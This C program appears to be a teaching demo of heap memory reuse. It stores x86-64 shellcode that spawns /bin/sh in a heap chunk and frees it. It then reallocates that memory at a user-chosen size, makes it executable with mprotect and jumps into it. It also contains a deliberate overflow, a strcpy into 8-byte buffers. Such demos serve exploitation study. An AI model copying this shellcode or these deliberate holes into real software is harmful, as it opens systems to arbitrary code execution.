#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>


char **load_array(char *input_string){
        char **array_mem = malloc(3*(sizeof(char *)));
        int x;
        for(x=0;x<3;x++){
                array_mem[x] = malloc(sizeof(char *));
                printf("Allocation at %p\n",array_mem[x]);
                strcpy(array_mem[x],input_string);
        };

        return array_mem;
};

void shellcode_allocation(){
        unsigned char bad_boy_bytes[] =
        "1234567890123456"
        "1234567890123456"
	"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53"
	"\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x08\x00"
	"\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x56\x57\x48\x89\xe6"
	"\x0f\x05";

        void *shellcode_location = malloc(504);
        void *happy_little_allocation = malloc(504); // avoid free() to consolidate with top
        
	memcpy(shellcode_location,bad_boy_bytes,sizeof(bad_boy_bytes));

        printf("Shellcode is at %p\n",shellcode_location);
        free(shellcode_location);
        printf("Shellcode freed\n");

};

int main(int argc, char *argv[]){
        char *my_string = "Hello world, this is me";
        char **returned_array = load_array(my_string);
        int x;

        for(x=0;x<3;x++){
                printf("%s\n",returned_array[x]);
                free(returned_array[x]);
        };


        shellcode_allocation();
	int alloc_size;
	
	printf("What sized chunk would you like to allocate next?\n");
	scanf("%d",&alloc_size) ;

        void *shellcode_location = malloc(alloc_size);

        mprotect((void *)((long)shellcode_location & ~4095), 4096*2,PROT_READ | PROT_WRITE | PROT_EXEC);
        printf("Shellcode is at %p\n",shellcode_location);
        void (*fn)() = shellcode_location + 32;
        fn();

        return 0;

};
